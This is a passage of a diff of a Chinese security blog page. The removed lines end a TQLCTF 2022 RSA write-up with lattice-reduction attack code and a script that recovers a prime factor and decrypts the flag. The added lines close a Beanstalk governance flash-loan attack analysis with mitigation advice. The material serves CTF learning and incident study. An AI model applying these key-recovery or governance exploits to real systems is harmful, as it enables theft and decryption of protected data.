-        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>tt<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>
-
-    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> G<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token keyword">if</span> j <span class="token keyword">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>
-                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
-    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-    <span class="token comment"># Construct lattice spanned by polynomials with yY and zZ</span>
-    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            L<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>Y<span class="token operator">*</span>y<span class="token punctuation">,</span>Z<span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-    <span class="token comment"># makes lattice upper triangular</span>
-    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span>L<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (before reduction):"</span><span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-    L <span class="token operator">=</span> L<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (after reduction):"</span><span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-    roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-
-    pol1 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    pol2 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token comment"># print(pol1(y=k-1,z=q)%e)</span>
-
-    <span class="token keyword">if</span> L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>norm<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span>e<span class="token operator">^</span>mm<span class="token punctuation">)</span><span class="token operator">/</span>sqrt<span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Can't attack,plz try bigger m,t"</span><span class="token punctuation">)</span>
-    r <span class="token operator">=</span> pol2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol1<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> r<span class="token punctuation">.</span>is_constant<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> 
-    <span class="token keyword">for</span> z0<span class="token punctuation">,</span> _ <span class="token keyword">in</span> r<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z0<span class="token punctuation">)</span>
-        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Potential z0:"</span><span class="token punctuation">,</span>z0<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> roots
-<span class="token keyword">print</span><span class="token punctuation">(</span>attack<span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>其中，将参数mm和tt提升到（6，4）的时候，运行一小段时间后可以得到结果</p>
-<p>即<code>q=169137218869484728712814942277531819318585090563481420862437016566714151</code></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod<span class="token punctuation">,</span>invert
-<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
-N<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>
-e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>
-c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>
-    
-q<span class="token operator">=</span><span class="token number">169137218869484728712814942277531819318585090563481420862437016566714151</span>
-p<span class="token operator">=</span>N<span class="token operator">//</span>q
-
-d<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以得到flag</p>
+<p>这里使用了forge的warp cheatcode，可以将timpstamp设置到一天之后，模拟真实场景。</p>
+<p>Expolit合约的代码就是一些闪电贷的Callback，投票并且执行提案，最后将一些token swap回ETH，这里不再赘述。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Defi治理实现了”区块链民主”，但是在带来民主的同时也带来了风险。对于治理合约管理者，要再三警惕恶意提案。同时，延迟执行链上治理也是防止恶意提案的一种方法，来保证组织资金的安全。这里我们给出几点建议。</p>
+<p>（1）将投票和执行分离，保证投票和执行不在同一个区块时间，即不能在同一笔交易内同时完成投票和执行，这样也可以避免闪电贷带来的风险。</p>
+<p>（2）增加权限，禁止合约投票，只能够通过EOA账户来投票，这样就可以规避闪电贷带来的影响。</p>
+<p>（3）项目方以及社区成员应高度关注所有提案，对于有风险的提案，<br>应及时做出反应以及通知，尽可能的杜绝恶意提案的执行。</p>
+<p>（4）在项目上线运行前，可以进行多次全面的合约审计，尽可能的保证合约的安全性。</p>
 
                 
             </div>
@@ -630,7 +634,7 @@ d<span class="token operator">=</span>invert<span class="token punctuation">(</s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lee-tc.github.io/2022/04/20/tqlctf-2022.2.19-2022.2.20/">https://lee-tc.github.io/2022/04/20/tqlctf-2022.2.19-2022.2.20/</a>
+                    <a href="https://lee-tc.github.io/2023/03/04/governace/">https://lee-tc.github.io/2023/03/04/governace/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -837,53 +841,18 @@ d<span class="token operator">=</span>invert<span class="token punctuation">(</s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2022/08/31/paradigmctf-2022-merkledrop-writeup/">
-                    <div class="card-image">
-                        
-                        <img src="https://cmichel.io/static/b8f9496bc81dd646385a4e24987f5c63/c75bb/featured.png" class="responsive-img" alt="ParadigmCTF 2022 MerkleDrop writeup">
-                        
-                        <span class="card-title">ParadigmCTF 2022 MerkleDrop writeup</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-31
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Latt1ce
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2022/04/20/tqlctf-2022.2.19-2022.2.20/">
+                <a href="/2023/03/04/governace/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="TQLCTF2022 hardrsa">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="从Benstalks攻击事件浅谈治理合约的安全问题">
                         
-                        <span class="card-title">TQLCTF2022 hardrsa</span>
+                        <span class="card-title">从Benstalks攻击事件浅谈治理合约的安全问题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -894,7 +863,7 @@ d<span class="token operator">=</span>invert<span class="token punctuation">(</s
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-04
                             </span>
                         <span class="publish-author">
                             
@@ -905,6 +874,43 @@ d<span class="token operator">=</span>invert<span class="token punctuation">(</s
                     </div>
                 </div>
 
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/11/07/ni-tai-qiang-wang-qu-kuai-lian-wp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="拟态强网区块链wp">
+                        
+                        <span class="card-title">拟态强网区块链wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Latt1ce
+                            
+                        </span>
+                    </div>
+                </div>
                 
             </div>
         </div>
